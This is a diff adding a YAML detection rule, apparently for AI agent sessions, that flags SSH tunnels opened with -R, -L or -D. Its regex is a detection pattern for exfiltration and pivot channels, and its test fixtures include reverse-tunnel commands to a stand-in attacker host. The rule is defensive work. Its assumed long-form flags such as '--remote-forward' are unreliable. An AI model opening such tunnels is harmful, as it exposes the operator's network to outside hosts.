@@ -1,0 +1,79 @@
+id: ssh-tunnel-egress
+version: 1
+title: SSH tunnel opened for egress (local / remote forward or SOCKS)
+description: >
+  An SSH client is invoked with a -R (remote) port-forward, -L (local)
+  port-forward, or -D (dynamic SOCKS proxy) flag. Forwarded ports are
+  a canonical exfil channel — a remote -R lets an external host reach
+  a port on the agent's machine through the SSH connection, and -D
+  exposes a SOCKS proxy that can be used as a generic egress tunnel
+  for any tool that honours the SOCKS env. From an agent session,
+  opening any of these tunnels is almost always suspicious: the agent
+  has no legitimate reason to expose a port on either side of its
+  operator's network. The rule is anchored on the ssh binary at a
+  command boundary and matches the long form (--remote-forward,
+  --local-forward, --dynamic) and the short form (-R/-L/-D).
+severity: high
+status: experimental
+posture: detect
+taxonomy:
+  owasp_llm: LLM06
+  mitre_atlas: AML.T0024
+
+match: >
+  e.event.action == "command.executed" && (
+    e.command.command.matches("(?i)(^|[;&|]\\s*|\\bsudo\\s+)\\s*(ssh|scp|sftp)\\b\\s+(-(R|L)\\s*\\d+:|-D\\s*\\d+\\b|--remote-forward\\b|--local-forward\\b|--dynamic\\b)")
+  )
+
+emit:
+  reason: "SSH tunnel opened for egress (ssh -R / -L / -D) — exfil or pivot channel"
+
+tests:
+  - name: ssh_reverse_tunnel
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "ssh -R 8080:localhost:80 user@attacker.example" }
+        session: { id: s1 }
+  - name: ssh_local_forward
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "ssh -L 9000:internal.host:80 user@jump" }
+        session: { id: s1 }
+  - name: ssh_dynamic_socks
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "ssh -D 1080 user@jump.example" }
+        session: { id: s1 }
+  - name: ssh_long_flag_remote_forward
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "ssh --remote-forward 8080:localhost:80 user@attacker" }
+        session: { id: s1 }
+  - name: sudo_ssh_reverse_tunnel
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "sudo ssh -R 8080:localhost:80 user@attacker.example" }
+        session: { id: s1 }
+  - name: ordinary_ssh_login
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "ssh user@server" }
+        session: { id: s1 }
+  - name: ssh_with_port_only
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "ssh -p 2222 user@server" }
+        session: { id: s1 }
+  - name: echo_ssh_tunnel
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "echo 'never run ssh -R in this repo' > notes.txt" }
+        session: { id: s1 }
